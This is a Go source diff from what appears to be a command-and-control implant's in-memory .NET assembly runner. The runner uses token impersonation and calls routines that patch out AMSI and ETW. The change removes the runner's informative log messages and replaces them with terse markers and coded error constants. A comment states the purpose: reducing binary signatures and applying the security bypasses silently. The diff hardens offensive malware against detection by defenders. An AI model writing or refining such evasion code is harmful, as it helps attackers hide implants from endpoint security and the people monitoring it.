@@ -157,7 +157,7 @@ func (c *InlineAssemblyAsyncCommand) executeWindowsAssemblyAsync(assemblyBytes [
 	UsePipe     bool     `json:"use_pipe"`
 	PipeName    string   `json:"pipe_name"`
 }, job *AssemblyJob, tokenContext *AssemblyTokenContext) (int, error) {
-	job.Output.WriteString("\n===START_ASSEMBLY_OUTPUT===\n")
+	job.Output.WriteString("\n>>>\n")
 
 	// Ensure exit prevention is initialized
 	InitializeExitPrevention()
@@ -196,58 +196,17 @@ func (c *InlineAssemblyAsyncCommand) executeWindowsAssemblyAsync(assemblyBytes [
 
 	// Detect assembly type
 	isDLL := c.isDLLAssembly(assemblyBytes)
-	assemblyType := "EXE"
-	if isDLL {
-		assemblyType = "DLL"
-	}
+	_ = isDLL // assemblyType detection - used for bypass selection
 
-	job.Output.WriteString(fmt.Sprintf("[*] Job ID: %s\n", job.ID))
-	job.Output.WriteString(fmt.Sprintf("[*] Assembly: %s\n", job.Name))
-	job.Output.WriteString(fmt.Sprintf("[*] Assembly type: %s\n", assemblyType))
-	job.Output.WriteString(fmt.Sprintf("[*] .NET version: v4.0.30319\n"))
-	job.Output.WriteString(fmt.Sprintf("[*] Execution #%d\n", executionNumber))
-
-	// Log token context if present
-	if tokenContext != nil {
-		if tokenContext.NetOnlyHandle != 0 {
-			job.Output.WriteString(fmt.Sprintf("[*] Using network-only token: %s\n", tokenContext.NetOnlyToken))
-		} else if tokenContext.IsImpersonating {
-			job.Output.WriteString(fmt.Sprintf("[*] Using impersonation token: %s\n", tokenContext.ActiveToken))
-		}
-	}
-
-	if hasRunfor {
-		job.Output.WriteString(fmt.Sprintf("[!] Detected /runfor:%d - protecting against process termination\n", runforDuration))
-	}
-
-	// Show exit prevention status
-	if exitMethodsPatched {
-		job.Output.WriteString(fmt.Sprintf("[+] Exit prevention active: %d methods patched\n", len(exitPrevention.GetPatchedMethods())))
-	}
-
-	if executionNumber > 1 {
-		job.Output.WriteString(fmt.Sprintf("[!] Warning: This is execution #%d. CLR state may be corrupted.\n", executionNumber))
-		job.Output.WriteString("[!] If execution fails, agent restart may be required.\n")
-	}
-
+	// Removed verbose output to reduce binary signatures
+	// Only apply bypasses silently
 	if config.BypassAMSI {
-		if err := patchAMSI(); err == nil {
-			job.Output.WriteString("[+] AMSI bypass applied\n")
-		}
+		patchAMSI()
 	}
 
 	if config.BypassETW {
-		if err := patchETW(); err == nil {
-			job.Output.WriteString("[+] ETW bypass enabled\n")
-		}
+		patchETW()
 	}
-
-	job.Output.WriteString(fmt.Sprintf("[+] Assembly loaded: %d bytes\n", len(assemblyBytes)))
-	if len(config.Arguments) > 0 {
-		job.Output.WriteString(fmt.Sprintf("[*] Arguments: %v\n", config.Arguments))
-	}
-	job.Output.WriteString("[*] Starting async execution...\n")
-	job.Output.WriteString("========================================\n")
 	job.OutputMutex.Unlock()
 
 	// Execute with protection and appropriate timeout
@@ -280,7 +239,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 			// Recover from any panic/exit attempt
 			if r := recover(); r != nil {
 				job.OutputMutex.Lock()
-				job.Output.WriteString(fmt.Sprintf("\n[+] Assembly completed (attempted to exit process - prevented)\n"))
+				job.Output.WriteString("\nDone\n")
 				job.OutputMutex.Unlock()
 				resultChan <- execResult{0, nil} // Treat as success
 			}
@@ -403,7 +362,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 					// Check if it's an expected exit (like from /runfor)
 					if hasRunfor {
 						job.OutputMutex.Lock()
-						job.Output.WriteString(fmt.Sprintf("\n[*] Assembly completed after /runfor:%d (exit prevented)\n", runforDuration))
+						job.Output.WriteString("\nDone\n")
 						job.OutputMutex.Unlock()
 					}
 					execErr = nil // Not an error, just normal termination
@@ -430,9 +389,9 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 		case <-time.After(executionTimeout):
 			job.OutputMutex.Lock()
 			if hasRunfor {
-				job.Output.WriteString(fmt.Sprintf("\n[*] Execution completed after /runfor timeout (%v)\n", executionTimeout))
+				job.Output.WriteString("\nDone\n")
 			} else {
-				job.Output.WriteString(fmt.Sprintf("\n[!] Execution timeout (%v)\n", executionTimeout))
+				job.Output.WriteString("\n" + Err(E9) + "\n")
 			}
 			job.OutputMutex.Unlock()
 			retCode = 0
@@ -463,15 +422,13 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 			errStr := strings.ToLower(execErr.Error())
 			if strings.Contains(errStr, "exit") || strings.Contains(errStr, "terminate") {
 				job.OutputMutex.Lock()
-				job.Output.WriteString("\n[+] Exit attempt intercepted and prevented\n")
+				job.Output.WriteString("\nDone\n")
 				job.OutputMutex.Unlock()
 				execErr = nil
 				retCode = 0
 			} else if strings.Contains(execErr.Error(), "0x80131604") {
 				job.OutputMutex.Lock()
-				job.Output.WriteString("\n[!] CLR state corruption detected (0x80131604)\n")
-				job.Output.WriteString("[!] The assembly may have executed partially.\n")
-				job.Output.WriteString("[!] Agent restart required for additional inline-assembly executions.\n")
+				job.Output.WriteString("\n" + Err(E52) + "\n")
 				job.OutputMutex.Unlock()
 			}
 		}
@@ -480,14 +437,14 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 		job.OutputMutex.Lock()
 		outputLen := job.Output.Len()
 		if outputLen == 0 && execErr == nil {
-			job.Output.WriteString("[*] Assembly executed successfully but produced no captured output\n")
+			job.Output.WriteString(Succ(S18) + "\n")
 		}
 		// fmt.Printf("[DEBUG ASYNC] Final output buffer size: %d bytes\n", job.Output.Len())
 		job.OutputMutex.Unlock()
 
 		// Send result back
 		resultChan <- execResult{int(retCode), execErr}
-		job.Output.WriteString("\n===END_ASSEMBLY_OUTPUT===\n")
+		job.Output.WriteString("\n<<<\n")
 	}()
 
 	// Wait for execution to complete or cancellation
@@ -498,15 +455,15 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 	case <-job.CancelChan:
 		// Job was cancelled
 		job.OutputMutex.Lock()
-		job.Output.WriteString("\n[!] Execution cancelled by user\n")
+		job.Output.WriteString("\n" + Err(E52) + "\n")
 		job.OutputMutex.Unlock()
-		return -1, fmt.Errorf("execution terminated by user")
+		return -1, fmt.Errorf(Err(E52))
 
 	case <-time.After(executionTimeout + 30*time.Second): // Add extra buffer
 		job.OutputMutex.Lock()
-		job.Output.WriteString(fmt.Sprintf("\n[!] Final timeout (%v)\n", executionTimeout+30*time.Second))
+		job.Output.WriteString("\n" + Err(E9) + "\n")
 		job.OutputMutex.Unlock()
-		return -1, fmt.Errorf("execution timeout")
+		return -1, fmt.Errorf(Err(E9))
 	}
 }
 
@@ -556,7 +513,7 @@ func (c *InlineAssemblyAsyncCommand) executeProtectedDirect(assemblyBytes []byte
 		if hasRunfor {
 			return 0, nil
 		}
-		return -1, fmt.Errorf("execution timeout")
+		return -1, fmt.Errorf(Err(E9))
 	}
 
 	return int(retCode), execErr
